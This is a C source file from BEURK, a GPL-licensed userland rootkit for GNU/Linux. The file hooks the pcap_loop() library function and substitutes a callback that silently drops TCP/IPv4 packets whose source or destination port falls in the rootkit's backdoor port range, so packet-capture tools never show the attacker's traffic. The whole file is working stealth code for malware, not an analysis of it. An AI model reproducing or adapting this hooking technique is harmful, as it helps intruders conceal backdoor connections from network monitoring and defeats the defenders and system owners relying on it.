/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _BSD_SOURCE /* use `struct tcphdr` from netinet instead of linux */

#include <pcap/pcap.h> /* pcap_loop(), pcap_t, pcap_handler */
#include <arpa/inet.h> /* ntohs() */
#include <netinet/ether.h> /* ETH_HLEN macro */
#include <netinet/ip.h> /* struct ip, IP_* macros */
#include <netinet/tcp.h> /* struct tcp, TCP_* macros */
#include "beurk.h" /* is_attacker(), is_hidden_file() */
#include "config.h" /* REAL_OPEN() */
#include "debug.h" /* DEBUG() */
#include "hooks.h" /* prototype */

/* ip header length in bytes */
#define IP_HLEN(ip)     (ip->ip_hl << 2)
/* tcp data offset in bytes */
#define TH_OFF(tcp)     (tcp->th_off << 2)

static void (*real_callback)(u_char *args, const struct pcap_pkthdr *header,
        const u_char *packet);

static int  is_backdoor_port(int port) {

    if (port >= LOW_BACKDOOR_PORT && port <= HIGH_BACKDOOR_PORT)
        return 1;
    else
        return 0;
}

static void fake_callback(u_char *args, const struct pcap_pkthdr *header,
        const u_char *packet) {
    const struct ip     *ip;
    const struct tcphdr *tcp;

    /* get ip header offset */
    ip = (struct ip*)(packet + ETH_HLEN);
    if (IP_HLEN(ip) < 20) {
        DEBUG(D_INFO, "invalid IP header length: %u bytes", IP_HLEN(ip));
        return ;
    }

    /* for the moment, traffic hidding is only supported on tcp/ipv4 */
    if (ip->ip_v != 4 || ip->ip_p != IPPROTO_TCP) {
        if (real_callback)
            real_callback(args, header, packet);
        return ;
    }

    /* get tcp header offset */
    tcp = (struct tcphdr*)(packet + ETH_HLEN + IP_HLEN(ip));
    if (TH_OFF(tcp) < 20) {
        DEBUG(D_INFO, "invalid TCP header length: %u bytes", TH_OFF(tcp));
        return ;
    }

    /* hide traffic if it's one of our ports */
    if (is_backdoor_port(ntohs(tcp->th_sport))
            || is_backdoor_port(ntohs(tcp->th_dport)))
        return ;

    /* otherwise, just run real callback */
    if (real_callback)
        real_callback(args, header, packet);
}

int     pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
    init();
    DEBUG(D_INFO, "called pcap_loop(3PCAP) hook");

    real_callback = callback;
    return REAL_PCAP_LOOP(p, cnt, fake_callback, user);
}
